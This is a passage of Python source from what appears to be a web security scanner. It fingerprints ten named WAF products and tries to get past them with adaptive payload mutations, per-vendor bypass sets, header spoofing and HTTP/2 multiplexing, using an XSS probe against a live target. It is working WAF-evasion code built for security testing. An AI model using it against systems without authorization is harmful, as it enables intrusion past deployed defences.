        blocked=True  -> WAF still blocked (failure).
        """
        with self._lock:
            st = self._stats[strategy]
            st["attempts"] += 1
            st["last_ts"] = time.time()
            if not blocked:
                st["successes"] += 1
            # Bayesian-style score: (successes + 1) / (attempts + 2)
            st["score"] = (st["successes"] + 1) / (st["attempts"] + 2)
            # Bonus for fast responses (not causing timeouts)
            if response_time_ms > 0 and not blocked:
                speed_bonus = min(0.05, 500.0 / max(response_time_ms, 1))
                st["score"] = min(1.0, st["score"] + speed_bonus)

    def rank_strategies(self, strategies: List[str]) -> List[str]:
        """
        Return strategies sorted by score (descending).
        Applies time decay to older scores to prefer fresh data.
        """
        now = time.time()
        scored: List[tuple] = []
        with self._lock:
            for name in strategies:
                st = self._stats[name]
                age_s = now - st["last_ts"] if st["last_ts"] else 0
                decay_factor = self._decay ** (age_s / 60.0)  # decay per minute
                effective_score = st["score"] * decay_factor
                scored.append((name, effective_score))
        scored.sort(key=lambda x: x[1], reverse=True)
        return [name for name, _ in scored]

    def best_strategy(self, candidates: List[str]) -> Optional[str]:
        """
        Epsilon-greedy: 80% pick best scored, 20% pick random (exploration).
        """
        if not candidates:
            return None
        if random.random() < self._epsilon:
            return random.choice(candidates)
        ranked = self.rank_strategies(candidates)
        return ranked[0] if ranked else candidates[0]

    def top_n(self, strategies: List[str], n: int = 3) -> List[str]:
        """Return top N strategies by score."""
        return self.rank_strategies(strategies)[:n]

    def summary(self) -> Dict[str, Any]:
        """Return scoring summary for diagnostics."""
        with self._lock:
            return {
                name: {
                    "attempts": st["attempts"],
                    "successes": st["successes"],
                    "score": round(st["score"], 3),
                }
                for name, st in sorted(
                    self._stats.items(),
                    key=lambda x: x[1]["score"],
                    reverse=True,
                )
            }


# Shared global scorer (used across scan sessions)
_GLOBAL_ML_SCORER = WAFBypassMLScorer()


def get_global_scorer() -> WAFBypassMLScorer:
    """Return the global WAF bypass ML scorer."""
    return _GLOBAL_ML_SCORER


# ---------------------------------------------------------------------------
# AdaptiveMutationEngine — payload mutation on 403/429 response
# ---------------------------------------------------------------------------

class AdaptiveMutationEngine:
    """
    Generates payload mutations when a WAF blocks a request (403/429).
    Each mutation strategy targets a different WAF detection mechanism.

    SOLID/OCP: Register new mutation strategies without modifying this class.
    """

    def __init__(self):
        self._tried: Dict[str, set] = defaultdict(set)

    # --- Public API ---

    def mutate(self, payload: str, category: str = "generic") -> List[str]:
        """
        Generate payload mutations. Returns list of candidate variants.
        Skips variants already tried for this payload.
        """
        mutations: List[str] = []
        for method in [
            self._case_mutate,
            self._comment_mutate,
            self._whitespace_mutate,
            self._url_encode_mutate,
            self._double_encode_mutate,
            self._unicode_mutate,
            self._hex_mutate,
            self._concat_mutate,
        ]:
            for variant in method(payload):
                key = f"{category}:{variant}"
                if key not in self._tried[payload]:
                    mutations.append(variant)

        # Deep WAF bypass variants from Mutator (fullwidth, null-byte, hex, polyglot)
        try:
            from websecure.core.mutator import Mutator as _Mutator
            cat_lower = (category or "").lower()
            _mutator_variants: list = []
            if "sql" in cat_lower or cat_lower in ("generic", ""):
                _mutator_variants.extend(_Mutator.mutate_sql(payload, max_variants=10))
            if "xss" in cat_lower or cat_lower in ("generic", ""):
                _mutator_variants.extend(_Mutator.mutate_xss(payload, max_variants=10))
            if "rce" in cat_lower or "cmd" in cat_lower:
                _mutator_variants.extend(_Mutator.mutate_rce(payload, max_variants=10))
            if "nosql" in cat_lower:
                _mutator_variants.extend(_Mutator.mutate_nosql(payload, max_variants=10))
            for variant in _mutator_variants:
                if not variant:
                    continue
                key = f"{category}:{variant}"
                if key not in self._tried[payload]:
                    mutations.append(variant)
        except Exception as _fix_e:
            logger.debug(f"[core.waf_bypass] {type(_fix_e).__name__}: {_fix_e!r}")

        return mutations

    def record_tried(self, payload: str, variant: str, category: str = "generic") -> None:
        self._tried[payload].add(f"{category}:{variant}")

    # --- Mutation strategies ---

    def _case_mutate(self, p: str) -> List[str]:
        """Random case: SELECT -> SeLeCt"""
        variants = []
        for _ in range(3):
            variants.append("".join(
                c.upper() if random.random() > 0.5 else c.lower() for c in p
            ))
        return variants

    def _comment_mutate(self, p: str) -> List[str]:
        """SQL comment injection: SELECT -> SE/**/LECT, SELECT -> SE/*!*/LECT"""
        if len(p) < 4:
            return []
        mid = len(p) // 2
        return [
            p[:mid] + "/**/" + p[mid:],
            p[:mid] + "/*!*/" + p[mid:],
            p[:mid] + "/*!" + p[mid:] + "*/",
            p[:mid] + "--\n" + p[mid:],
        ]

    def _whitespace_mutate(self, p: str) -> List[str]:
        """Whitespace substitution: space -> tab, newline, vertical tab"""
        return [
            p.replace(" ", "\t"),
            p.replace(" ", "\n"),
            p.replace(" ", "\r\n"),
            p.replace(" ", "%09"),
            p.replace(" ", "%0a"),
            p.replace(" ", "%0d%0a"),
        ]

    def _url_encode_mutate(self, p: str) -> List[str]:
        """URL-encode suspicious characters."""
        from urllib.parse import quote
        result = []
        for char, enc in [("'", "%27"), ('"', "%22"), ("<", "%3c"), (">", "%3e"), ("=", "%3d")]:
            if char in p:
                result.append(p.replace(char, enc))
        result.append(quote(p, safe="=&?"))
        return result

    def _double_encode_mutate(self, p: str) -> List[str]:
        """Double URL-encode: %27 -> %2527"""
        import re as _re
        return [_re.sub(r'%([0-9A-Fa-f]{2})', lambda m: f'%25{m.group(1)}', p)]

    def _unicode_mutate(self, p: str) -> List[str]:
        """Unicode confusable / fullwidth equivalents for ASCII letters (WAF signature confusion)."""
        # Cyrillic/Latin lookalikes that visual-match but differ at byte level
        _map = {
            'a': 'а',  # Cyrillic а
            'e': 'е',  # Cyrillic е
            'i': 'і',  # Cyrillic і
            'o': 'о',  # Cyrillic о
            's': 'ѕ',  # Cyrillic ѕ
            'l': 'Ӏ',  # Cyrillic Ӏ
            'n': 'ո',  # Armenian ո
            'r': 'г',  # Cyrillic г (approximate)
            'c': 'с',  # Cyrillic с
            'p': 'р',  # Cyrillic р
            'x': 'х',  # Cyrillic х
        }
        return ["".join(_map.get(c.lower(), c) for c in p)]

    def _hex_mutate(self, p: str) -> List[str]:
        """Hex-encode chars for SQL context: a -> 0x61"""
        if len(p) > 20:
            return []
        hex_str = "0x" + p.encode().hex()
        return [hex_str]

    def _concat_mutate(self, p: str) -> List[str]:
        """String concatenation bypass: 'admin' -> 'adm'||'in' (Oracle/Postgres)"""
        if len(p) < 4 or "'" not in p:
            return []
        mid = len(p) // 2
        return [
            p[:mid] + "'||'" + p[mid:],
            p[:mid] + "'+'" + p[mid:],
            p[:mid] + "\" \"+\"" + p[mid:],
        ]


# ---------------------------------------------------------------------------
# HTTP2MultiplexingEvasion — HTTP/2 stream multiplexing WAF bypass
# ---------------------------------------------------------------------------

class HTTP2MultiplexingEvasion:
    """
    HTTP/2 multiplexing-based WAF evasion.

    Sends multiple payloads as concurrent HTTP/2 streams on a SINGLE connection.
    Some WAFs apply rate-limiting per connection (not per stream) and may
    fail to inspect all multiplexed streams individually.

    Requires: httpx with h2 support (pip install httpx[http2] h2)

    SOLID/SRP: Only responsible for HTTP/2 multiplexed request dispatch.
    """

    def __init__(self, timeout: float = 10.0, max_concurrent_streams: int = 20):
        self.timeout = timeout
        self.max_concurrent_streams = max_concurrent_streams

    def send_multiplexed(
        self,
        url: str,
        payloads: List[Dict[str, Any]],
        base_headers: Optional[Dict[str, str]] = None,
    ) -> List[Dict[str, Any]]:
        """
        Send N payloads as concurrent HTTP/2 streams on one connection.

        payloads: list of {"params": {...}, "headers": {...}, "method": "GET"}
        Returns: list of {"payload": {...}, "status": int, "body": str, "error": str}
        """
        try:
            import httpx
        except ImportError:
            _logger.warning("[HTTP2Mux] httpx not available: pip install httpx[http2]")
            return []

        results: List[Dict[str, Any]] = []
        chunks = [
            payloads[i:i + self.max_concurrent_streams]
            for i in range(0, len(payloads), self.max_concurrent_streams)
        ]

        try:
            import asyncio

            async def _run_batch(batch: List[Dict]) -> List[Dict]:
                async with httpx.AsyncClient(
                    http2=True,
                    timeout=httpx.Timeout(self.timeout),
                    verify=False,
                    headers=base_headers or {},
                ) as client:
                    tasks = [self._send_one(client, url, p) for p in batch]
                    return await asyncio.gather(*tasks, return_exceptions=True)

            for chunk in chunks:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                try:
                    batch_results = loop.run_until_complete(_run_batch(chunk))
                    for i, res in enumerate(batch_results):
                        if isinstance(res, Exception):
                            results.append({"payload": chunk[i], "error": str(res), "status": 0})
                        else:
                            results.append(res)
                finally:
                    loop.close()

        except Exception as e:
            _logger.debug(f"[HTTP2Mux] Error: {e}")

        return results

    async def _send_one(
        self,
        client,
        url: str,
        payload: Dict[str, Any],
    ) -> Dict[str, Any]:
        method = (payload.get("method") or "GET").upper()
        params = payload.get("params") or {}
        headers = payload.get("headers") or {}
        body = payload.get("body")
        try:
            if method == "POST":
                r = await client.post(url, params=params, headers=headers,
                                      content=body, timeout=self.timeout)
            else:
                r = await client.get(url, params=params, headers=headers)
            return {
                "payload": payload,
                "status": r.status_code,
                "body": r.text[:512],
                "http_version": r.http_version,
                "error": None,
            }
        except Exception as e:
            return {"payload": payload, "status": 0, "body": "", "error": str(e)}

    def probe_waf_with_h2(
        self, url: str, attack_payloads: List[str], param: str = "q"
    ) -> Dict[str, Any]:
        """
        Convenience: inject attack_payloads into `param` via HTTP/2 multiplexing.
        Returns summary of blocked vs passed.
        """
        payloads = [{"params": {param: p}, "method": "GET"} for p in attack_payloads]
        results = self.send_multiplexed(url, payloads)
        blocked = [r for r in results if r.get("status", 0) in (403, 429, 406)]
        passed = [r for r in results if r.get("status", 0) not in (0, 403, 429, 406)]
        return {
            "total": len(results),
            "blocked": len(blocked),
            "passed": len(passed),
            "pass_rate": round(len(passed) / max(len(results), 1), 2),
            "http2_used": any(r.get("http_version") == "HTTP/2" for r in results),
            "results": results,
        }


# ===========================================================================
# WAF FINGERPRINTING + BYPASS SCANNER — Faz D (WAF Bypass Engine)
# Classes: WAFFingerprint, WAFBypassLibrary, AdaptiveWAFBypass, WAFBypassScanner
# ===========================================================================

class WAFFingerprint:
    """
    Lightweight WAF vendor detector for scanner use.
    Inspects HTTP response headers, cookies, and body to identify the WAF vendor.

    SOLID/SRP: Only responsible for WAF vendor identification from a response object.
    """

    SIGNATURES: Dict[str, Dict] = {
        "cloudflare": {
            "headers": ["CF-Ray", "CF-Cache-Status", "cf-request-id"],
            "cookies": ["__cfduid", "cf_clearance", "__cf_bm"],
            "body_patterns": [
                "Cloudflare Ray ID",
                "cloudflare.com",
                "DDoS protection by Cloudflare",
                "Attention Required! | Cloudflare",
            ],
        },
        "sucuri": {
            "headers": ["X-Sucuri-ID", "X-Sucuri-Cache"],
            "cookies": ["sucuri_cloudproxy_uuid"],
            "body_patterns": [
                "Sucuri WebSite Firewall",
                "Access Denied - Sucuri",
            ],
        },
        "imperva": {
            "headers": ["X-Powered-By-Imperva", "X-Iinfo", "X-Cdn"],
            "cookies": ["visid_incap_", "incap_ses_", "visid_incap", "incap_ses"],
            "body_patterns": [
                "Incapsula incident ID",
                "Request unsuccessful. Incapsula",
                "_Incapsula_Resource",
            ],
        },
        "aws_waf": {
            "headers": ["X-AMZ-CF-ID", "X-Cache", "X-Amzn-Requestid"],
            "cookies": ["aws-waf-token", "AWSALB"],
            "body_patterns": ["AWS WAF", "Request blocked"],
        },
        "akamai": {
            "headers": [],
            "server_patterns": ["AkamaiGHost", "Akamai"],
            "cookies": ["ak_bmsc", "bm_sz"],
            "body_patterns": [
                "Access Denied",
                "Reference #",
                r"Reference #\d+\.\w+\.\d+",
            ],
        },
        "modsecurity": {
            "headers": ["X-Mod-Security-Violations", "Mod-Security"],
            "cookies": [],
            "body_patterns": [
                "ModSecurity",
                "mod_security",
                "NAXSI_FMT",
                "406 Not Acceptable",
                "Not Acceptable!",
            ],
        },
        "f5_bigip": {
            "headers": ["X-WA-Info"],
            "cookies": ["TS01", "BIGipServer"],
            "body_patterns": [
                "The requested URL was rejected",
                "Please consult with your administrator",
                "F5 Networks",
            ],
        },
        "azure_waf": {
            "headers": ["X-Azure-Ref", "X-Ms-Request-Id"],
            "cookies": [],
            "body_patterns": [
                "The request is blocked",
                "Azure Web Application Firewall",
                "RequestId:",
            ],
        },
        "fortiweb": {
            "headers": ["X-Fw-Errcode"],
            "cookies": ["FORTITOKEN"],
            "body_patterns": [
                "FortiWeb",
                "This request is blocked by the Web Application Firewall",
            ],
        },
        "barracuda": {
            "headers": [],
            "cookies": ["barra_counter_session"],
            "body_patterns": [
                "Barracuda Web Application Firewall",
                "bwf_bl",
            ],
        },
    }

    def detect(self, response) -> str:
        """
        Inspect a requests.Response object and return the WAF vendor name.
        Returns 'unknown' if no signature matches.
        """
        try:
            resp_headers = {k.lower(): v for k, v in (response.headers or {}).items()}
            resp_cookies = {k.lower(): v for k, v in (response.cookies or {}).items()}
            resp_body = ""
            try:
                resp_body = response.text[:8192]
            except Exception as _fix_e:
                logger.debug(f"[core.waf_bypass] {type(_fix_e).__name__}: {_fix_e!r}")

            best_vendor = "unknown"
            best_score = 0

            for vendor, sig in self.SIGNATURES.items():
                score = 0

                # Check response headers
                for hdr in sig.get("headers", []):
                    if hdr.lower() in resp_headers:
                        score += 2

                # Check server header against server_patterns
                server_val = resp_headers.get("server", "")
                for sp in sig.get("server_patterns", []):
                    if sp.lower() in server_val.lower():
                        score += 2

                # Check cookies
                for ck_prefix in sig.get("cookies", []):
                    for ck_name in resp_cookies:
                        if ck_name.startswith(ck_prefix.lower()):
                            score += 2
                            break

                # Check body patterns
                for pattern in sig.get("body_patterns", []):
                    if pattern.lower() in resp_body.lower():
                        score += 3

                if score > best_score:
                    best_score = score
                    best_vendor = vendor

            return best_vendor if best_score >= 2 else "unknown"

        except Exception as exc:
            _logger.debug(f"[WAFFingerprint] Detection error: {exc!r}")
            return "unknown"


class WAFBypassLibrary:
    """
    Per-WAF bypass mutation library.
    Returns a list of bypass descriptor dicts for a given WAF vendor.

    SOLID/OCP: New WAF bypass sets can be added to BYPASS_SETS without
    modifying the retrieval logic.
    """

    BYPASS_SETS: Dict[str, List[Dict[str, Any]]] = {
        "cloudflare": [
            # Unicode normalization bypass: replace angle brackets with fullwidth equivalents
            {
                "type": "unicode",
                "transform": lambda p: p.replace("<", "＜").replace(">", "＞"),
            },
            # Chunked Transfer-Encoding header hint (adapter applies actual chunking)
            {
                "type": "header",
                "header": "Transfer-Encoding",
                "value": "chunked",
            },
            # Case mutation: alternate upper/lower per character
            {
                "type": "case",
                "transform": lambda p: "".join(
                    c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)
                ),
            },
            # Referrer spoofing
            {
                "type": "header",
                "header": "Referer",
                "value": "https://www.google.com/",
            },
        ],
        "aws_waf": [
            # Double URL encode angle brackets: < -> %253C
            {
                "type": "encode",
                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E")
                    .replace("'", "%2527").replace('"', "%2522"),
            },
            # Uppercase all alpha chars
            {
                "type": "case",
                "transform": lambda p: p.upper(),
            },
            # HPP (split first half)
            {
                "type": "hpp",
                "transform": lambda p: p[: max(1, len(p) // 2)],
            },
        ],
        "imperva": [
            # SQL comment injection between spaces
            {
                "type": "comment",
                "transform": lambda p: p.replace(" ", "/**/"),
            },
            # Tab instead of space
            {
                "type": "whitespace",
                "transform": lambda p: p.replace(" ", "\t"),
            },
            # Newline injection
            {
                "type": "newline",
                "transform": lambda p: p.replace(" ", "\n"),
            },
        ],
        "modsecurity": [
            # Multipart Content-Type hint (header only)
            {
                "type": "header",
                "header": "Content-Type",
                "value": "multipart/form-data; boundary=--xyz1234",
            },
            # CDATA wrap for XML contexts
            {
                "type": "cdata",
                "transform": lambda p: f"<![CDATA[{p}]]>",
            },
            # Overlong UTF-8 percent-encoding of angle brackets
            {
                "type": "overlong",
                "transform": lambda p: p.replace("<", "%C0%BC").replace(">", "%C0%BE"),
            },
        ],
        "akamai": [
            # Case randomization
            {
                "type": "case",
                "transform": lambda p: "".join(
                    c.upper() if random.random() > 0.5 else c.lower() for c in p
                ),
            },
            # Accept header abuse
            {
                "type": "header",
                "header": "Accept",
                "value": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            },
        ],
        "f5_bigip": [
            # Path suffix to confuse normalizer
            {
                "type": "path_suffix",
                "transform": lambda p: p,  # suffix applied at request level
                "suffix": ";.css",
            },
            # Double encode
            {
                "type": "encode",
                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E"),
            },
        ],
        "sucuri": [
            # Referrer + XFF spoofing (header-type)
            {
                "type": "header",
                "header": "X-Forwarded-For",
                "value": "127.0.0.1",
            },
            # Unicode chars
            {
                "type": "unicode",
                "transform": lambda p: p.replace("<", "＜").replace(">", "＞"),
            },
        ],
        "azure_waf": [
            # JSON unicode escape of payload
            {
                "type": "json_escape",
                "transform": lambda p: "".join(
                    f"\\u{ord(c):04x}" if c in "<>\"'" else c for c in p
                ),
            },
            # Double URL encode
            {
                "type": "encode",
                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E"),
            },
        ],
        "generic": [
            # HPP split — send first half of payload
            {
                "type": "hpp",
                "transform": lambda p: p[: max(1, len(p) // 2)],
            },
            # Accept header abuse
            {
                "type": "header",
                "header": "Accept",
                "value": "text/html,application/xhtml+xml,*/*",
            },
            # Case mutation
            {
                "type": "case",
                "transform": lambda p: "".join(
                    c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(p)
                ),
            },
            # Comment injection
            {
                "type": "comment",
                "transform": lambda p: p.replace(" ", "/**/"),
            },
            # Double encode
            {
                "type": "encode",
                "transform": lambda p: p.replace("<", "%253C").replace(">", "%253E"),
            },
        ],
    }

    def get_bypasses(self, waf_name: str) -> List[Dict[str, Any]]:
        """
        Return bypass descriptor list for the given WAF vendor.
        Falls back to 'generic' if the vendor is not in the library.
        Always appends generic bypasses to the vendor-specific list.
        """
        specific = self.BYPASS_SETS.get(waf_name, [])
        generic = self.BYPASS_SETS.get("generic", [])
        # Merge: vendor-specific first, then generic ones not already present
        specific_types = {b.get("type") for b in specific}
        merged = list(specific)
        for b in generic:
            if b.get("type") not in specific_types:
                merged.append(b)
        return merged


class AdaptiveWAFBypass:
    """
    Adaptive WAF bypass engine.
    Iterates over WAF-specific bypass mutations and probes the target until
    a non-blocking response is received.

    SOLID/SRP: Only responsible for trying bypass mutations against a live target.
    """

    def __init__(self, session, waf_name: str):
        """
        session  : requests.Session (or WAFBypassSession) for HTTP requests
        waf_name : detected WAF vendor string (e.g. 'cloudflare', 'unknown')
        """
        self.session = session
        self.waf_name = waf_name
        self._bypass_library = WAFBypassLibrary()
        # ML scorer: ranks bypass strategies by historical success rate
        self._scorer = get_global_scorer()
        # Adaptive mutation engine: generates payload variants on block
        self._mutation_engine = AdaptiveMutationEngine()

    def try_bypass(
        self,
        url: str,
        param: str,
        payload: str,
        timeout: int = 10,
    ) -> Optional[Dict[str, Any]]:
        """
        Try WAF-specific bypass mutations on the given URL + param + payload.

        Returns the first successful bypass as::

            {
                "bypass_type": str,
                "mutated_payload": str,
                "response_code": int,
                "waf": str,
            }

        Returns None if all bypass attempts are blocked (or error).
        """
        bypasses = self._bypass_library.get_bypasses(self.waf_name)

        # ML scorer: rank strategies by historical success rate (epsilon-greedy)
        strategy_names = [b.get("type", "unknown") for b in bypasses]
        ranked_names = self._scorer.rank_strategies(strategy_names)
        ranked_bypasses = sorted(
            bypasses,
            key=lambda b: ranked_names.index(b.get("type", "unknown"))
            if b.get("type", "unknown") in ranked_names else len(ranked_names),
        )

        for bypass in ranked_bypasses:
            b_type = bypass.get("type", "unknown")
            transform = bypass.get("transform")
            t0 = time.time()

            try:
                # Header-only bypass: inject a special header, use original payload
                if b_type == "header":
                    extra_headers = {bypass["header"]: bypass["value"]}
                    resp = self.session.get(
                        url,
                        params={param: payload},
                        headers=extra_headers,
                        timeout=timeout,
                        allow_redirects=True,
                    )
                    mutated = payload  # payload unchanged for header-type bypasses
                elif transform is not None:
                    # Transform the payload and send
                    mutated = transform(payload)
                    resp = self.session.get(
                        url,
                        params={param: mutated},
                        timeout=timeout,
                        allow_redirects=True,
                    )
                else:
                    # No transform and not a header bypass — skip
                    continue

                elapsed_ms = (time.time() - t0) * 1000
                blocked = resp.status_code in (403, 406, 429)
                self._scorer.record_attempt(b_type, blocked=blocked, status_code=resp.status_code, response_time_ms=elapsed_ms)

                # A non-403/non-406 status indicates the WAF was bypassed
                if not blocked:
                    _logger.debug(
                        f"[AdaptiveWAFBypass] Bypass SUCCESS: type={b_type} "
                        f"status={resp.status_code} waf={self.waf_name}"
                    )
                    return {
                        "bypass_type": b_type,
                        "mutated_payload": mutated,
                        "response_code": resp.status_code,
                        "waf": self.waf_name,
                    }

                # WAF still blocking — try AdaptiveMutationEngine variants
                for mutated_variant in self._mutation_engine.mutate(payload, category="generic")[:3]:
                    try:
                        resp2 = self.session.get(
                            url,
                            params={param: mutated_variant},
                            timeout=timeout,
                            allow_redirects=True,
                        )
                        if resp2.status_code not in (403, 406, 429):
                            _logger.debug(
                                f"[AdaptiveWAFBypass] Mutation bypass SUCCESS: type={b_type} "
                                f"status={resp2.status_code} waf={self.waf_name}"
                            )
                            self._mutation_engine.record_tried(payload, mutated_variant)
                            return {
                                "bypass_type": f"{b_type}+mutation",
                                "mutated_payload": mutated_variant,
                                "response_code": resp2.status_code,
                                "waf": self.waf_name,
                            }
                    except Exception as _fix_e:
                        logger.debug(f"[core.waf_bypass] {type(_fix_e).__name__}: {_fix_e!r}")

            except Exception as exc:
                _logger.debug(f"[AdaptiveWAFBypass] Bypass attempt ({b_type}) failed: {exc!r}")
                continue

        return None


# ---------------------------------------------------------------------------
# WAFBypassScanner — BaseScanner integration
# ---------------------------------------------------------------------------

class WAFBypassScanner:
    """
    Scanner that detects WAF presence and validates bypass feasibility.

    Workflow:
      1. Fingerprint the WAF via WAFFingerprint (header/cookie/body analysis).
      2. Confirm the WAF blocks a known-malicious XSS payload (expects 403).
      3. Attempt WAF bypass mutations via AdaptiveWAFBypass.
      4. Report findings:
           - Bypass succeeds          -> Critical
           - WAF detected, no bypass  -> Medium
           - No WAF detected          -> Informational

    SOLID/SRP: Only responsible for WAF detection and bypass validation.
    """

    name = "waf_bypass"

    # XSS probe payload — known to trigger most WAFs
    _PROBE_PAYLOAD = "<script>alert(1)</script>"
    _PROBE_PARAM = "q"

    def __init__(self, session=None, results: Optional[Dict] = None, debug: bool = False):
        try:
            from websecure.scanners.base import BaseScanner
            # Compose rather than inherit to avoid circular import risk
            self._base = BaseScanner(session=session, results=results, debug=debug)
        except Exception:
            self._base = None

        self.session = (self._base.session if self._base else None) or session
        if self.session is None:
            import requests as _req
            self.session = _req.Session()
            self.session.headers["User-Agent"] = get_random_user_agent()

        self.results: Dict = (self._base.results if self._base else None) or (results if results is not None else {})
        self.debug = debug
        self.logger = logging.getLogger("websecure.scanners.waf_bypass")
        if debug:
            self.logger.setLevel(logging.DEBUG)

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _add(self, bucket: str, entry: Dict[str, Any]) -> None:
        """Add finding via BaseScanner if available, else direct."""
        import time as _time
        entry.setdefault("timestamp", _time.time())
        if self._base is not None:
            try:
                self._base.add(bucket, entry)
                return
            except Exception as _fix_e:
                logger.debug(f"[core.waf_bypass] {type(_fix_e).__name__}: {_fix_e!r}")
        with threading.Lock():
            self.results.setdefault(bucket, []).append(entry)

    # ------------------------------------------------------------------
    # Main scan logic
    # ------------------------------------------------------------------

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Run WAF detection and bypass validation against target URL.

        Returns results dict with 'waf_bypass' bucket populated.
        """
        findings: List[Dict] = []
        self.logger.info(f"[WAFBypassScanner] Scanning: {target}")

        # ---- Step 1: Probe baseline response to fingerprint WAF ----
        waf_vendor = "unknown"
        try:
            baseline_resp = self.session.get(
                target, timeout=10, allow_redirects=True
            )
            fingerprinter = WAFFingerprint()
            waf_vendor = fingerprinter.detect(baseline_resp)
            self.logger.debug(f"[WAFBypassScanner] WAF fingerprint: {waf_vendor}")
        except Exception as exc:
            self.logger.debug(f"[WAFBypassScanner] Baseline probe failed: {exc!r}")

        # ---- Step 2: Also use WAFDetector for confidence-scored detection ----
        waf_profile = None
        try:
            detector = WAFDetector(timeout=10)
            waf_profile = detector.detect(target, session=self.session)
            if waf_profile.detected and waf_vendor == "unknown":
                waf_vendor = waf_profile.vendor
        except Exception as exc:
            self.logger.debug(f"[WAFBypassScanner] WAFDetector failed: {exc!r}")

        # ---- Step 3: Confirm WAF blocks the XSS payload ----
        waf_blocks_payload = False
        if waf_vendor != "unknown" or (waf_profile and waf_profile.detected):
            try:
                probe_resp = self.session.get(
                    target,
                    params={self._PROBE_PARAM: self._PROBE_PAYLOAD},
                    timeout=10,
                    allow_redirects=True,
                )
                waf_blocks_payload = probe_resp.status_code in (403, 406, 429, 503)
                self.logger.debug(
                    f"[WAFBypassScanner] Probe status={probe_resp.status_code} "
                    f"blocks_payload={waf_blocks_payload}"
                )
            except Exception as exc:
                self.logger.debug(f"[WAFBypassScanner] Payload probe failed: {exc!r}")

        # ---- Step 4: Attempt bypass if WAF is confirmed ----
        if waf_vendor != "unknown" and waf_blocks_payload:
            bypass_engine = AdaptiveWAFBypass(
                session=self.session,
                waf_name=waf_vendor,
            )
            bypass_result = bypass_engine.try_bypass(
                url=target,
                param=self._PROBE_PARAM,
                payload=self._PROBE_PAYLOAD,
                timeout=10,
            )

            if bypass_result:
                # Bypass succeeded — Critical finding
                finding = {
                    "type": "WAF Bypass",
                    "url": target,
                    "severity": "Critical",
                    "detail": (
                        f"WAF ({waf_vendor}) was successfully bypassed using "
                        f"'{bypass_result['bypass_type']}' mutation. "
                        f"Payload reached server with HTTP {bypass_result['response_code']}."
                    ),
                    "evidence": {
                        "waf_vendor": waf_vendor,
                        "bypass_type": bypass_result["bypass_type"],
                        "mutated_payload": bypass_result["mutated_payload"],
                        "response_code": bypass_result["response_code"],
                        "original_payload": self._PROBE_PAYLOAD,
                    },
                }
                findings.append(finding)
                self._add("waf_bypass", finding)
                self.logger.warning(
                    f"[WAFBypassScanner] CRITICAL: WAF bypass confirmed "
                    f"({waf_vendor}, type={bypass_result['bypass_type']})"
                )

            else:
                # WAF detected but not bypassed — Medium
                finding = {
                    "type": "WAF Detected",
                    "url": target,
                    "severity": "Medium",
                    "detail": (
                        f"WAF ({waf_vendor}) detected and successfully blocking payloads. "
                        f"No bypass found with current mutation library."
                    ),
                    "evidence": {
                        "waf_vendor": waf_vendor,
                        "confidence": getattr(waf_profile, "confidence", None),
                        "bypass_strategies_tried": len(
                            WAFBypassLibrary().get_bypasses(waf_vendor)
                        ),
                    },
                }
                findings.append(finding)
                self._add("waf_bypass", finding)
                self.logger.info(
                    f"[WAFBypassScanner] WAF detected ({waf_vendor}), no bypass found."
                )

        elif waf_vendor != "unknown" and not waf_blocks_payload:
            # WAF present but not blocking this payload (misconfigured or benign)
            finding = {
                "type": "WAF Detected (Not Blocking)",
                "url": target,
                "severity": "Low",
                "detail": (
                    f"WAF ({waf_vendor}) detected but did not block the XSS probe payload. "
                    f"WAF may be in monitoring-only mode or misconfigured."
                ),
                "evidence": {
                    "waf_vendor": waf_vendor,
                    "probe_payload": self._PROBE_PAYLOAD,
                },
            }
            findings.append(finding)
            self._add("waf_bypass", finding)

        else:
            # No WAF detected — Informational
            finding = {
                "type": "No WAF Detected",
                "url": target,
                "severity": "Informational",
                "detail": (
                    "No WAF signature detected. Target may be directly exposed "
                    "without a Web Application Firewall."
                ),
                "evidence": {
                    "waf_vendor": "none",
                },
            }
            findings.append(finding)
            self._add("waf_bypass", finding)
            self.logger.info("[WAFBypassScanner] No WAF detected.")

        # ---- Phase 2: HTTP/2 Multiplexing Evasion (if WAF detected) ----
        if waf_vendor != "unknown" and waf_blocks_payload:
            try:
                h2_evasion = HTTP2MultiplexingEvasion(timeout=10.0, max_concurrent_streams=10)
                h2_payloads = [
                    {"params": {self._PROBE_PARAM: self._PROBE_PAYLOAD}, "method": "GET"},
                    {"params": {self._PROBE_PARAM: f"/*{self._PROBE_PAYLOAD}*/"}, "method": "GET"},
                    {"params": {self._PROBE_PARAM: self._PROBE_PAYLOAD.replace("<", "%3C")}, "method": "GET"},
                ]
                h2_results = h2_evasion.send_multiplexed(target, h2_payloads)
                for h2r in h2_results:
                    if isinstance(h2r, dict) and not h2r.get("error") and h2r.get("status", 403) not in (403, 406, 429):
                        h2_finding = {
                            "type": "WAF Bypass via HTTP/2 Multiplexing",
                            "url": target,
                            "severity": "Critical",
                            "detail": (
                                f"WAF ({waf_vendor}) bypassed via HTTP/2 multiplexed stream. "
                                f"Payload reached server with HTTP {h2r.get('status')}."
                            ),
                            "evidence": {"waf_vendor": waf_vendor, "h2_status": h2r.get("status"), "payload": h2r.get("payload")},
                        }
                        findings.append(h2_finding)
                        self._add("waf_bypass", h2_finding)
                        break
            except Exception as exc:
                self.logger.debug(f"[WAFBypassScanner] HTTP2MultiplexingEvasion failed: {exc!r}")

        self.results.setdefault("waf_bypass_summary", {"vulnerabilities": len(findings)})
        return self.results


# ---------------------------------------------------------------------------
# Module-level run() — required for plugin_registry functional wrapper
# ---------------------------------------------------------------------------

def run(
    url: str,
    session=None,
    results: Optional[Dict] = None,
    debug: bool = False,
    **kwargs,
) -> Dict[str, Any]:
    """
    Module-level entry point for WAFBypassScanner.
    Compatible with both direct calls and plugin_registry functional wrapper.
    """
    try:
        scanner = WAFBypassScanner(session=session, results=results, debug=debug)
        return scanner.run(url, **kwargs)
    except Exception as exc:
        _logger.error(f"[waf_bypass.run] Unhandled error: {exc!r}")
        return results or {}
